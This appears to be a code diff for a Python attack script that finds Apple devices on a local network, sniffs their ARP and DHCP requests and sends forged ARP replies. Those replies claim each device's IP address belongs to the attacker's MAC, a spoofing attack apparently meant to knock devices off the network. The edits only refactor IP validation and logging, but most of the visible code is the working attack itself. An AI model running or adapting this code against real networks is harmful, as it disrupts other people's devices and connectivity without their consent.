@@ -16,7 +16,6 @@ from ipaddress import IPv4Address
 from scapy.all import Ether, ARP, DHCP, sniff
 from socket import socket, AF_PACKET, SOCK_RAW
 from time import sleep
-import re
 # endregion
 
 # region Check user, platform and print banner
@@ -39,7 +38,6 @@ args = parser.parse_args()
 # region Set global variables
 apple_devices = []
 apple_device = []
-ip_pattern = re.compile("^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
 target_ip = None
 # endregion
 
@@ -77,7 +75,7 @@ Base.print_info("Last ip address: ", last_ip)
 
 # region Check target IP and new IP addresses
 if args.target_ip is not None:
-    if ip_pattern.match(args.target_ip):
+    if Base.ip_address_validation(args.target_ip):
         if IPv4Address(unicode(first_ip)) <= IPv4Address(unicode(args.target_ip)) <= IPv4Address(unicode(last_ip)):
             target_ip = args.target_ip
             Base.print_info("Target IP address: ", target_ip)
@@ -89,16 +87,20 @@ if args.target_ip is not None:
         exit(1)
 # endregion
 
-# ARP reply sender
+
+# region ARP reply sender
 def send_arp_reply():
     arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
                                   ethernet_dst_mac=apple_device[1],
                                   sender_mac=your_mac_address, sender_ip=apple_device[0],
                                   target_mac=apple_device[1], target_ip=apple_device[0])
     socket_global.send(arp_reply)
-    Base.print_info("Send ARP response: ", apple_device[0], " is at ", your_mac_address)
+    Base.print_info("ARP response to:   ", apple_device[1], " \"",
+                    apple_device[0] + " is at " + your_mac_address, "\"")
+# endregion
 
-# Analyze request in sniffer
+
+# region Analyze request in sniffer
 def sniffer_prn(request):
     global apple_device
 
@@ -107,7 +109,8 @@ def sniffer_prn(request):
         if request[ARP].op == 1:
             if request[Ether].dst == "ff:ff:ff:ff:ff:ff" and request[ARP].hwdst == "00:00:00:00:00:00":
                 if request[ARP].pdst == apple_device[0]:
-                    Base.print_info("ARP request: Who has ", apple_device[0], " ?")
+                    Base.print_info("ARP request from:  ", request[Ether].src, " \"",
+                                    "Who has " + request[ARP].pdst + "? Tell " + request[ARP].psrc, "\"")
                     send_arp_reply()
     # endregion
 
@@ -119,14 +122,19 @@ def sniffer_prn(request):
                     apple_device[0] = str(option[1])
                     Base.print_success("DHCP REQUEST from: ", apple_device[1], " requested ip: ", apple_device[0])
     # endregion
+# endregion
 
-# Sniff ARP and DHCP request from target
+
+# region Sniff ARP and DHCP request from target
 def sniffer():
-    Base.print_info("Waiting for ARP or DHCP REQUEST from ", apple_device[0] + " (" +apple_device[1] + ")")
+    Base.print_info("Waiting for ARP or DHCP REQUEST from ", apple_device[0] + " (" + apple_device[1] + ")")
     sniff(lfilter=lambda d: d.src == apple_device[1],
           filter="arp or (udp and src port 68 and dst port 67)",
           prn=sniffer_prn, iface=listen_network_interface)
+# endregion
 
+
+# region Main function
 if __name__ == "__main__":
 
     # region Find Apple devices in local network with arp-scan or nmap
@@ -162,11 +170,13 @@ if __name__ == "__main__":
     # endregion
 
     # region Send first ARP reply
-    Base.print_warning("Send first (init) ARP reply ...")
     sleep(5)
+    Base.print_warning("Send first (init) ARP reply ...")
     send_arp_reply()
     # endregion
 
     # region Wait for completion
     tm.wait_for_completion()
     # endregion
+
+# endregion
